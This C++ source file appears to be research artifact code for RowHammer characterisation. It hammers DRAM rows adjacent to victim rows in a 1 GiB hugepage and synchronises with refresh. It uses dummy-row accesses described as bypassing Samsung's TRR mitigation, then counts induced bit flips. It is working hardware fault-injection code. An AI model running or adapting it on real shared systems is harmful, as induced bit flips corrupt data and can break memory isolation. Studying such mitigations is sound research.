#include <iostream>
#include <fstream>
#include <immintrin.h>
#include <random>
#include <algorithm>

#include <stdio.h>
#include <unistd.h>
#include <inttypes.h>
#include <utility>
#include <linux/kernel-page-flags.h>
#include <fcntl.h>

#include <bits/stdc++.h>
#include <sched.h>
#include <sys/resource.h>

#include <sys/mman.h>

#include "Hist.h"
#include "Mapping.h"

#include <getopt.h>

std::vector<std::pair<ulong, ulong>> hypothetically_conflicting_addresses;

std::vector<unsigned long long> record;

void dump_record(std::string fn)
{
    // dump all record entries to binary file
    std::ofstream ofs(fn, std::ios::binary);
    for (auto &r : record)
        ofs.write((char *)&r, sizeof(r));
}

std::mt19937 rng;

uintptr_t generate_random_address(uintptr_t arr, std::uniform_int_distribution<unsigned> &dist)
{
    int row_offset = dist(rng);
    return arr + row_offset * (8192);
}

int check_bit_flips(Mapping &victim, unsigned long long victim_data)
{
    int no_bit_flips = 0;
    for (int i = 0 ; i < 8192/sizeof(unsigned long long) ; i++)
    {
        //std::cout << std::hex << (*(unsigned long long*) victim.to_virt()) << std::dec << std::endl;
        no_bit_flips += __builtin_popcountll((*(unsigned long long*) victim.to_virt()) ^ victim_data);
        victim.increment_column_dw();
    }
    victim.reset_column();
    return no_bit_flips;
}

void initialize_rows(Mapping &victim, Mapping &aggr1, Mapping &aggr2, Mapping *dummy, int no_dummy_rows, unsigned long long victim_data)
{
    for (int i = 0 ; i < 8192/sizeof(unsigned long long) ; i++)
    {
        *((unsigned long long*) victim.to_virt()) = victim_data;
        *((unsigned long long*) aggr1.to_virt()) = ~victim_data;
        *((unsigned long long*) aggr2.to_virt()) = ~victim_data;
        // clflush the victim
        asm volatile("clflush (%0)" : : "r" ((unsigned long long*) victim.to_virt()) : "memory");
        // also warmup the dummy rows
        for (int j = 0 ; j < no_dummy_rows ; j++)
        {
            *((unsigned long long*) dummy[j].to_virt()) = 0x0;
            dummy[j].increment_column_dw();  
        }

        victim.increment_column_dw();
        aggr1.increment_column_dw();
        aggr2.increment_column_dw();
    }

    victim.reset_column();
    aggr1.reset_column();
    aggr2.reset_column();

    for (int j = 0 ; j < no_dummy_rows ; j++)
        dummy[j].reset_column();
}

/**
 * Reproduce results from Section 6.2
 * Apply samsung patterns to observe bit flips
 * @param target pointer to 1 GiB contiguous physical memory
 */
__attribute__((optimize("unroll-loops")))
int do_samsung_utrr(uintptr_t target, int no_aggr_acts, int no_reads, int victim_count)
{
    int no_sync_acts = 2;       // activate sync aggressors this many times
    // The dummy rows are placed in different banks
    int no_dummy_acts = 4;       // activate dummy rows this many times

    // this is pretty arbitrary, we keep hammering for a long time
    // hoping for REF synchronization to work in our favor
    int iteration_per_victim = 8205*100; 

    // mask the most significant bits: the bits after the 30th bit (i.e., GiB boundary)
    uintptr_t most_significant_bits = ((uintptr_t) target) & ~((1ULL << 30ULL) - 1);

    // initialize mt PRNG
    rng.seed(1337); 
    int no_of_rows = (1ULL << 30)/8192; 
    std::cout << " no_of_rows " << no_of_rows << std::endl;
    std::uniform_int_distribution<unsigned> dist(0,no_of_rows);

    // addressing for victim, aggressor, and dummy rows
    Mapping base_victim;
    Mapping victim;
    Mapping aggr1;
    Mapping aggr2;
    // rows used in synchronizing with refresh
    Mapping sync1;
    Mapping sync2;
    Mapping dummy_rows[16];

    Hist h(100);
    Hist h_hammer(100);
    Hist gl(100);

    // atb fix victim row generation
    base_victim.decode_new_address(target);
    base_victim.reset_column();

    int total_bitflips = 0;

    struct timespec tglob1, tglob2;

    // at each iteration we test a new victim row
    // 14000 is an arbitrary number that we use
    // as a row address offset from the base victim row
    for (int i = 14000; i < 14000 + victim_count; i++)
    {
        victim = Mapping(base_victim);
        for (int j = 0 ; j < i ; j++)
            victim.increment_row();

        // find aggressor rows, the ones that are adjacent to victim row
        aggr1 = Mapping(victim); aggr1.increment_row();
        aggr2 = Mapping(victim); aggr2.decrement_row();

        // find sync rows, these should be seperated from the victim & aggressors
        sync1 = Mapping(victim);
        sync2 = Mapping(victim);
        for (int j = 0 ; j < 1000 ; j++)
        {
            sync1.increment_row();
            sync2.increment_row();
        }
        sync2.increment_row(); // increment in one more two have different sync rows.

        // report the victim & aggressor rows being tested.
        std::cout << "Bank " << victim.get_bank() << " Victim Row " << victim.get_row() << " Aggr1 Row " << aggr1.get_row() << " Aggr2 Row " << aggr2.get_row() << std::endl;
        
        // assign somehow nearby rows to dummy row addresses
        for (int j = 0 ; j < 16 ; j++)
        {
            dummy_rows[j] = Mapping(victim);
            for (int k = 0 ; k < j + 100 ; k++)
                dummy_rows[j].increment_row();
            //std::cout << "Dummy Row " << j << " " << dummy_rows[j].get_row() << std::endl;
        }

        // initialize the victim and surrounding rows with the checkerboard pattern
        initialize_rows(victim, aggr1, aggr2, dummy_rows, 16, 0x5555555555555555ULL);

        // calculate victim & aggr & sync & dummy virtual addresses

        // 2 sync rows, "no_sync_acts" cache blocks accessed each
        volatile unsigned long long *sync_a[no_sync_acts*2];
        // 2 aggressors, "no_aggr_acts" cache blocks accessed each
        volatile unsigned long long *aggr_a[256];
        // "16" dummies, "no_dummy_acts" cache blocks accessed each
        volatile unsigned long long *dummy_a[no_dummy_acts*16];


        // sync_a stores pointers to sync rows
        for (int j = 0 ; j < no_sync_acts ; j++)
        {
            sync_a[j*2 + 0] = (volatile unsigned long long *) (sync1.to_virt());
            sync_a[j*2 + 1] = (volatile unsigned long long *) (sync2.to_virt());
            sync1.increment_column_cb();
            sync2.increment_column_cb();
        }

        sync1.reset_column();
        sync2.reset_column();

        // aggr_a stores pointers to aggr rows
        for (int j = 0 ; j < 128 ; j++)
        {
            aggr_a[j*2 + 0] = (volatile unsigned long long *) (aggr1.to_virt());
            aggr_a[j*2 + 1] = (volatile unsigned long long *) (aggr2.to_virt());
            aggr1.increment_column_cb();
            aggr2.increment_column_cb();
        }

        aggr1.reset_column();
        aggr2.reset_column();

        // dummy_a stores pointers to dummy rows
        for (int j = 0 ; j < no_dummy_acts ; j++)
        {
            for (int k = 0 ; k < 16 ; k++)
            {
                dummy_a[j*16 + k] = (volatile unsigned long long *) (dummy_rows[k].to_virt());
                dummy_rows[k].increment_column_cb();
            }
        }

        for (int j = 0 ; j < no_dummy_acts ; j++)
        {
            for (int k = 0 ; k < 16 ; k++)
                dummy_rows[k].reset_column();
        }

        unsigned cycles_low, cycles_high, cycles_low1, cycles_high1;
        unsigned gl_cycles_low, gl_cycles_high, gl_cycles_low1, gl_cycles_high1;
        struct timespec t1, t2;
        unsigned cycles_total = 0;

        // warmup the record vector
        record.clear();
        for (int j = 0 ; j < iteration_per_victim ; j++)
            record.push_back(0);

        for (int j = 0; j < 10; j++)
            sched_yield();
     
        // Evict rows used in synchronizing with refresh
        for (int j = 0 ; j < no_sync_acts ; j++)
        {
            *(sync_a[j*2 + 0]);
            *(sync_a[j*2 + 1]);
            asm volatile("clflush (%0)" : : "r" (sync_a[j*2 + 0]) : "memory");
            asm volatile("clflush (%0)" : : "r" (sync_a[j*2 + 1]) : "memory");
        }   

        // =================== SYNCHRONIZE /w REF =========================
        while (true)
        {
            asm volatile ("lfence");

            #ifdef USE_RDTSC
            asm volatile ("RDTSCP\n\t" 
                    "mov %%edx, %0\n\t" 
                    "mov %%eax, %1\n\t": "=r" (cycles_high), "=r" (cycles_low):: 
                    "%rax", "%rbx", "%rcx", "%rdx");
            #else
            clock_gettime(CLOCK_REALTIME, &t1);
            #endif

            // Test <no_tries> times and average # of cycles
            for (int j = 0 ; j < no_sync_acts ; j++)
            {
                *(sync_a[j*2 + 0]);
                *(sync_a[j*2 + 1]);
                asm volatile("clflush (%0)" : : "r" (sync_a[j*2 + 0]) : "memory");
                asm volatile("clflush (%0)" : : "r" (sync_a[j*2 + 1]) : "memory");
                // To access different cache blocks in the aggressor row            
            }   

            // Break immediately after we deduce a REF occured recently
            // i.e., it took four row conflicts more than 1K cycles to execute
            #ifdef USE_RDTSC
            asm volatile ("RDTSCP\n\t" 
                    "mov %%edx, %0\n\t" 
                    "mov %%eax, %1\n\t": "=r" (cycles_high1), "=r" (cycles_low1):: 
                    "%rax", "%rbx", "%rcx", "%rdx");
                    
            if (cycles_low1-cycles_low > 1000)
                break;
            #else
            clock_gettime(CLOCK_REALTIME, &t2);
            if (t2.tv_nsec - t1.tv_nsec > 450) // 450ns ~= 1K TSC cycles
                break;
            #endif
        }


        // =================== HAMMER ALGO 1 ============================

        // For each iteration, activate & read with the specified amount; and refresh again
        for (int j = 0 ; j < iteration_per_victim ; j++)
        {
            asm volatile("lfence");

            #ifdef TIME_GLOBAL
            clock_gettime(CLOCK_REALTIME, &tglob1);
            #endif

            // Activate no_aggr_acts times
            for (int k = 0 ; k < no_aggr_acts ; k++)
            {
                asm volatile("mfence");
                // For each activation read both aggressors no_reads times, which will adjust the aggressor on time
                for (int i = 0 ; i < no_reads ; i++)
                    *(aggr_a[i*2 + 0]);

                for (int i = 0 ; i < no_reads ; i++)
                    *(aggr_a[i*2 + 1]);

                // flush the cache lines so that we access DRAM again in the next iteration
                for (int i = 0 ; i < no_reads ; i++)
                    asm volatile("clflushopt (%0)" : : "r" (aggr_a[i*2 + 0]) : "memory");

                for (int i = 0 ; i < no_reads ; i++)
                    asm volatile("clflushopt (%0)" : : "r" (aggr_a[i*2 + 1]) : "memory");
            }   

            // perform dummy accesses to bypass the TRR mechanism
            for (int k = 0 ; k < no_dummy_acts ; k++)
            {
                asm volatile("mfence");
                for (int l = 0 ; l < 16 ; l++)
                    *(dummy_a[k*16 + l]);
                for (int l = 0 ; l < 16 ; l++)
                    asm volatile("clflush (%0)" : : "r" (dummy_a[k*16 + l]) : "memory");
            }   

            asm volatile ("mfence");

            // =================== SYNCHRONIZE /w REF =========================
            while (true) 
            {
                asm volatile ("lfence");

                #ifdef USE_RDTSC
                asm volatile ("RDTSCP\n\t" 
                        "mov %%edx, %0\n\t" 
                        "mov %%eax, %1\n\t": "=r" (cycles_high), "=r" (cycles_low):: 
                        "%rax", "%rbx", "%rcx", "%rdx");
                #else
                clock_gettime(CLOCK_REALTIME, &t1);
                #endif

                // Test <no_tries> times and average # of cycles
                for (int k = 0 ; k < no_sync_acts ; k++)
                {
                    *(sync_a[k*2 + 0]);
                    *(sync_a[k*2 + 1]);
                    asm volatile("clflush (%0)" : : "r" (sync_a[k*2 + 0]) : "memory");
                    asm volatile("clflush (%0)" : : "r" (sync_a[k*2 + 1]) : "memory");
                }   

                // Break immediately after we deduce a REF occured recently
                // i.e., it took four row conflicts more than 1K cycles to execute
                #ifdef USE_RDTSC
                asm volatile("RDTSCP\n\t" 
                        "mov %%edx, %0\n\t" 
                        "mov %%eax, %1\n\t": "=r" (cycles_high1), "=r" (cycles_low1)::
                        "%rax", "%rbx", "%rcx", "%rdx");

                if (cycles_low1-cycles_low > 1000 && cycles_low1-cycles_low < 1500)
                    break;
                #else
                clock_gettime(CLOCK_REALTIME, &t2);
                if (t2.tv_nsec - t1.tv_nsec > 450) // 450ns ~= 1K TSC cycles
                    break;
                #endif

            }
            #ifdef TIME_GLOBAL
            clock_gettime(CLOCK_REALTIME, &tglob2);
            record[j] = tglob2.tv_nsec - tglob1.tv_nsec;
            #endif
        } // =================== HAMMER END ====================================

        // ========================== FIN.  ================================

        asm volatile("mfence");

        for (int j = 0; j < 10; j++)
            sched_yield();
        
        // accumulate the total number of bitflips with the given activation count & read number across all tested victim rows
        int bitflips = check_bit_flips(victim, 0x5555555555555555ULL);
        total_bitflips += bitflips;
        // std::cout << "Victim " << victim.get_row() << " done. " << std::endl; 

        // median of record
        if (iteration_per_victim > 1)
        {
            std::sort(record.begin(), record.end());
            std::cout << record[iteration_per_victim/2] << "ns" << std::endl;
        }

        std::cout << "[REPORT] Row " << i+1 << " with bit flip count " << bitflips << std::endl;
    }
    return total_bitflips;
}

/**
 * Reproduce results from Section 6.3
 * @param target pointer to 1 GiB contiguous physical memory
 */
__attribute__((optimize("unroll-loops")))
int verify_tAggOn(uintptr_t target)
{
    // open latency.txt for writing
    std::ofstream latency_file;
    latency_file.open("latency.txt");

    // initialize mt PRNG
    rng.seed(1337); 
    int no_of_rows = (1ULL << 30)/8192; 
    std::uniform_int_distribution<unsigned> dist(0,no_of_rows);
    
    Mapping aggr1;
    Mapping aggr2;
    Mapping temp;

    struct timespec tglob1, tglob2, tglob3;
    unsigned cycles_low, cycles_high, cycles_low1, cycles_high1;

    uintptr_t random_address = generate_random_address(target, dist);


    // generate two row addresses far away from each other (aggr1 and aggr2)
    aggr1.decode_new_address(random_address);
    aggr1.reset_column();

    aggr2.decode_new_address(random_address);
    aggr2.reset_column();

    aggr2.increment_row(); aggr2.increment_row(); aggr2.increment_row();
    aggr2.increment_row(); aggr2.increment_row(); aggr2.increment_row();
    aggr2.increment_row(); aggr2.increment_row(); aggr2.increment_row();
    aggr2.increment_row(); aggr2.increment_row(); aggr2.increment_row();
    aggr2.increment_row(); aggr2.increment_row(); aggr2.increment_row();
    aggr2.increment_row(); aggr2.increment_row(); aggr2.increment_row();
    aggr2.increment_row(); aggr2.increment_row(); aggr2.increment_row();
    aggr2.increment_row(); aggr2.increment_row(); aggr2.increment_row();
    aggr2.increment_row(); aggr2.increment_row(); aggr2.increment_row();
    aggr2.increment_row(); aggr2.increment_row(); aggr2.increment_row();


    // access temp once between aggr1 and aggr2 to try to bring
    // system state back to the initial state
    temp.decode_new_address(random_address);
    temp.reset_column();

    temp.increment_row(); temp.increment_row(); temp.increment_row();
    temp.increment_row(); temp.increment_row(); temp.increment_row();
    temp.increment_row(); temp.increment_row(); temp.increment_row();
    temp.increment_row(); temp.increment_row(); temp.increment_row();
    temp.increment_row(); temp.increment_row(); temp.increment_row();
    
    // 2 aggressors, "no_aggr_acts" cache blocks accessed each
    volatile unsigned long long *aggr_a1[128];
    volatile unsigned long long *aggr_a2[128];


    volatile unsigned long long *temp_a;
    for (int j = 0 ; j < 128 ; j++)
    {
        aggr_a1[j] = (volatile unsigned long long *) (aggr1.to_virt());
        aggr_a2[j] = (volatile unsigned long long *) (aggr2.to_virt());
        // print aggra[j*2 + 0]
        aggr1.increment_column_cb();
        aggr2.increment_column_cb();
    }

    temp_a = (volatile unsigned long long *) (temp.to_virt());
       
    for (int i = 0 ; i < 128 ; i++)
        asm volatile("clflushopt (%0)" : : "r" (aggr_a1[i]) : "memory");
    for (int i = 0 ; i < 128 ; i++)
        asm volatile("clflushopt (%0)" : : "r" (aggr_a2[i]) : "memory");

    int values_aggr1[128] = {0};
    int values_aggr2[128] = {0};
    
    for (int i = 0 ; i < 128 ; i++){
        values_aggr1[i] = 0;
        values_aggr2[i] = 0;
    }

    // warmup
    // Test <no_tries> times and average # of cycles
    for (int iters = 0; iters < 100000; iters++)
    {
        for (int k = 0; k < 128; k++)
        {
            clock_gettime(CLOCK_REALTIME, &tglob1);
            *(aggr_a1[k]);
            *(aggr_a2[k]);
            *(temp_a);
            asm volatile("lfence");
            clock_gettime(CLOCK_REALTIME, &tglob2);
            values_aggr1[k] = tglob2.tv_nsec - tglob1.tv_nsec;
            values_aggr2[k] = tglob2.tv_nsec - tglob1.tv_nsec;
            asm volatile("mfence");
        }

        for (int i = 0; i < 128; i++)
            asm volatile("clflushopt (%0)" :: "r"(aggr_a1[i]) : "memory");
        for (int i = 0; i < 128; i++)
            asm volatile("clflushopt (%0)" :: "r"(aggr_a2[i]) : "memory");
    }

    for (int i = 0 ; i < 128 ; i++){
        values_aggr1[i] = 0;
        values_aggr2[i] = 0;
    }
    
    for (int i = 0 ; i < 128 ; i++)
        asm volatile("clflushopt (%0)" : : "r" (aggr_a1[i]) : "memory");
    for (int i = 0 ; i < 128 ; i++)
        asm volatile("clflushopt (%0)" : : "r" (aggr_a2[i]) : "memory");
    
    asm volatile("mfence");

    for (int iters = 0 ; iters < 100000 ; iters++)
    {
        for (int k = 0 ; k < 128 ; k++)
        {
            #ifdef USE_RDTSC
            // Intel Vol2 SW DEV MANUAL
            // If software requires RDTSC to be executed only after all previous 
            // instructions have executed and all previous loads are globally visible,
            //  it can execute LFENCE immediately before RDTSC.

            asm volatile("lfence");
            asm volatile ("RDTSCP\n\t" 
                    "mov %%edx, %0\n\t" 
                    "mov %%eax, %1\n\t": "=r" (cycles_high), "=r" (cycles_low):: 
                    "%rax", "%rbx", "%rcx", "%rdx");
            #else
            clock_gettime(CLOCK_REALTIME, &tglob1);
            #endif
            *(aggr_a1[k]);
            asm volatile("lfence");
            #ifdef USE_RDTSC
            asm volatile ("RDTSCP\n\t" 
                    "mov %%edx, %0\n\t" 
                    "mov %%eax, %1\n\t": "=r" (cycles_high1), "=r" (cycles_low1):: 
                    "%rax", "%rbx", "%rcx", "%rdx");
            values_aggr1[k] = cycles_low1 - cycles_low;
            #else
            clock_gettime(CLOCK_REALTIME, &tglob2);
            values_aggr1[k] = tglob2.tv_nsec - tglob1.tv_nsec;
            #endif
            asm volatile("mfence");
        }

        *(temp_a);
        asm volatile("clflushopt (%0)" : : "r" (temp_a) : "memory");
        asm volatile("mfence");

        for (int k = 0 ; k < 128 ; k++)
        {
            #ifdef USE_RDTSC
            asm volatile("lfence");
            asm volatile ("RDTSCP\n\t" 
                    "mov %%edx, %0\n\t" 
                    "mov %%eax, %1\n\t": "=r" (cycles_high), "=r" (cycles_low):: 
                    "%rax", "%rbx", "%rcx", "%rdx");
            #else
            clock_gettime(CLOCK_REALTIME, &tglob1);
            #endif
            *(aggr_a2[k]);
            asm volatile("lfence");
            #ifdef USE_RDTSC
            asm volatile ("RDTSCP\n\t" 
                    "mov %%edx, %0\n\t" 
                    "mov %%eax, %1\n\t": "=r" (cycles_high1), "=r" (cycles_low1):: 
                    "%rax", "%rbx", "%rcx", "%rdx");
            values_aggr2[k] = cycles_low1 - cycles_low;
            #else
            clock_gettime(CLOCK_REALTIME, &tglob2);
            values_aggr2[k] = tglob2.tv_nsec - tglob1.tv_nsec;
            #endif
            asm volatile("mfence");
        }

        for (int i = 0 ; i < 128 ; i++)
            asm volatile("clflushopt (%0)" : : "r" (aggr_a1[i]) : "memory");
        for (int i = 0 ; i < 128 ; i++)
            asm volatile("clflushopt (%0)" : : "r" (aggr_a2[i]) : "memory");

        asm volatile("mfence");

        latency_file << "aggr1 ";
        for (int i = 0 ; i < 128 ; i++)
            latency_file << std::dec << values_aggr1[i] << " ";
        latency_file << std::endl;
        latency_file << "aggr2 ";
        for (int i = 0 ; i < 128 ; i++)
            latency_file << std::dec << values_aggr2[i] << " ";
        latency_file << std::endl;

        asm volatile("mfence");
    }
    // close the file
    latency_file.close();
}

void physical_address_hammer(bool is_verify, int victim_count)
{
    std::cout << "Running Algorithm 1..." << std::endl;
    
    // Allocate a large contiguous chunk of memory
    ulong MEM_SIZE = 1ULL << 30ULL;
    volatile char *start_address = (volatile char *) 0x2000000000;
    const std::string hugetlbfs_mountpoint = "/mnt/huge/buff";
    volatile char *target = nullptr;
    FILE *fp;
    fp = fopen(hugetlbfs_mountpoint.c_str(), "w+");
    if (fp==nullptr) {
      std::cerr << "Could not mount superpage" << std::endl;
      exit(EXIT_FAILURE);
    }
    auto mapped_target = mmap((void *) start_address, MEM_SIZE, PROT_READ | PROT_WRITE,
        MAP_SHARED | MAP_ANONYMOUS | MAP_HUGETLB | (30UL << MAP_HUGE_SHIFT), fileno(fp), 0);
    if (mapped_target==MAP_FAILED) {
      perror("mmap");
      exit(EXIT_FAILURE);
    }
    target = (volatile char*) mapped_target;
   
    std::cerr << "Mounted superpage at " << std::hex << (uintptr_t) target << std::dec << std::endl;

    Mapping::base_address = (uintptr_t) target;
    
    if(is_verify){
        verify_tAggOn((uintptr_t) target);
    }
    else{
        const int experiment_count = 10;
        // read aggressors this many times
        int no_reads_arr[experiment_count] = {1, 2, 4, 8, 16, 32, 48, 64, 80, 128};
        // this array determines the index of no_reads_arr up to which that much read count can be fit into a refresh window with the given activation count
        // e.g., for activation count 3, we can perform number of reads upto no_reads_arr[experiment_counts[4-3]] = no_reads_arr[9] = 80 (not including)
        int experiment_counts[4] = {7, 9, 10, 10};
        
        // activate aggressors this many times
        for(int i = 4; i > 0; i--){
            // perform this many reads after each activation 
            for(int j = 0; j < experiment_counts[4-i]; j++){
                std::cout << "[REPORT] Experiment with number of activations: " << i << " and number of reads: " << no_reads_arr[j] << std::endl;
                do_samsung_utrr((uintptr_t) target, i, no_reads_arr[j], victim_count);
            }
        }
    }
}

int main(int argc, char *argv[])
{
    int index;
    int o;
    std::string line;

    bool is_verify = false;
    // number of victim rows to hammer
    int victim_count = 1500;

    static struct option long_options[] = {{"verify", no_argument, 0, 'v'}, {"num_victims", required_argument, 0, 'n'}, {0, 0, 0, 0}};

    while ((o = getopt_long(argc, argv, "vn:", long_options, &index)) != -1)
    {
        switch (o)
        {
        case 'n':
        {
            victim_count = std::atoi(optarg);
            break;
        }
        case 'v':
        {
            is_verify = true;
            break;
        }
        }
    }

    physical_address_hammer(is_verify, victim_count);
    exit(0);
}
